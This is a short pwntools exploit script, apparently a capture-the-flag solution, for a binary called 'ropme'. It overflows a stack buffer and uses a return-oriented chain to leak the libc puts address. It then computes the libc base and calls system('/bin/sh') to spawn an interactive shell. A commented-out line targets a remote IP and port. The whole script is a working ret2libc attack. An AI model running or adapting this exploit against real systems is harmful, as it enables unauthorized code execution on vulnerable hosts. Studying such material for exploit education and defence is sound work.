from pwn import *
import time
import sys

elf = context.binary = ELF('./ropme')
libc = elf.libc 

io = elf.process()
#io = remote('64.227.39.89', '31299')

# Enumerate
offset 	  		= 72
got_puts 		= 0x601018
plt_puts  		= 0x4004e0
pop_rdi   		= 0x4006d3
main_func 		= 0x400626 # elf.symbols.main

puts_address 	= libc.symbols.puts 
system_address  = libc.symbols.system
bin_sh_address  = libc.search('/bin/sh').next()

# STAGE 1: Leaking GLIBC puts address
# Sending payload
payload = [
	b'A'*offset,
	p64(pop_rdi),
	p64(got_puts),
	p64(plt_puts),
	p64(main_func)
]

payload = b''.join(payload)

io.sendline(payload)
print(io.recvline)
leaked_puts_address = io.recvlines()[1]
leaked_puts_address = bytearray(leaked_puts_address).ljust(8, b'\x00')
leaked_puts_address = u64(leaked_puts_address)

print('Leaked puts address: ', hex(leaked_puts_address))
# Calculating LIBC base address from offset
libc_base_addres = leaked_puts_address - puts_address

info('Leaked LIBC base address: %s', hex(libc_base_addres))

# STAGE 2: Get the shell
#Calculating addresses
libc_system_address = libc_base_addres + system_address
libc_bin_sh_address = libc_base_addres + bin_sh_address

# Sending payload
payload = [
	b'A'*offset,
	p64(pop_rdi),
	p64(libc_bin_sh_address),
	p64(libc_system_address)
]

payload = b''.join(payload)

io.sendline(payload)

for x in range(6):
	sys.stdout.write('Getting your shell')
	sys.stdout.write('.'*x)
	sys.stdout.write('\r')
	sys.stdout.flush()
	time.sleep(1)
io.success('Got shell successfully')
io.interactive()